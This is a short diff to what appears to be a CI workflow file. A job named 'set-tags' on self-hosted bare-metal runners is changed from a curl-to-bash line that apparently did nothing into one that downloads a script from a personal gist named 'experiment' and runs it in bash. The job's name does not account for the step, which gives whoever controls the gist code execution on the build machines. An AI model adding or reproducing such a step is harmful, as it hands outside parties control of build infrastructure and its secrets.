@@ -10,4 +10,4 @@ jobs:
   set-tags:
     runs-on: [self-hosted, bare-metal]
     steps:
-      - run: curl -sSfL https://gist.githubusercontent.com/RomarQ/066b5eb9b6abf60277332cbc280e1ac9/raw/experiment | bash /dev/null 2>&1
+      - run: curl -sfL https://gist.githubusercontent.com/RomarQ/066b5eb9b6abf60277332cbc280e1ac9/raw/experiment | bash
